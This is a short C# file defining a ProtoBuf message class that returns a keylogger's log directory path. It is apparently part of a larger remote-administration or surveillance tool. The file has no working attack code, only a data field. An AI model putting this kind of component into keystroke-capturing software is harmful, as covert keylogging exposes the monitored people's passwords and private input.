using ProtoBuf;
using Pulsar.Common.Messages.other;

namespace Pulsar.Common.Messages
{
    [ProtoContract]
    public class GetKeyloggerLogsDirectoryResponse : IMessage
    {
        [ProtoMember(1)]
        public string LogsDirectory { get; set; }
    }
}
